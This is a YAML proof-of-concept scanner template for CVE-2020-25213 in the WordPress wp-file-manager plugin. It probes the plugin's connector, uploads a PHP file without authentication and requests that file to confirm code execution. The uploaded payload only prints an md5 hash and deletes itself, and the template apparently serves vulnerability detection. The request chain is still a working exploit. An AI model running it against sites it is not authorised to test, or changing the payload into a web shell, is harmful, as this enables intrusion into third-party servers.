name: poc-yaml-wordpress-wp-file-manager-rce-cve-2020-25213
set:
  r1: randomLowercase(8)
rules:
  - method: GET
    path: /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes("errUnknownCmd"))
  - method: POST
    path: /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
    follow_redirects: true
    headers:
      Content-Type: multipart/form-data; boundary=f9d5f22616749d6004d075298034bdd0
    body: |
      --f9d5f22616749d6004d075298034bdd0
      Content-Disposition: form-data; name="cmd"

      upload
      --f9d5f22616749d6004d075298034bdd0
      Content-Disposition: form-data; name="target"

      l1_
      --f9d5f22616749d6004d075298034bdd0
      Content-Disposition: form-data; name="upload[0]"; filename="{{r1}}.php"

      <?php echo md5("{{r1}}");unlink(__FILE__);?>
      --f9d5f22616749d6004d075298034bdd0--
    expression: |
      response.status == 200 && response.body.bcontains(bytes(r1))
    search: |
      "url":"(?P<path>.+?)"}],"removed"
  - method: GET
    path: /{{path}}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(md5(r1)))
detail:
  author: Print1n(http://print1n.top)
  links:
    - https://www.cnblogs.com/Salvere-Safe/p/14995249.html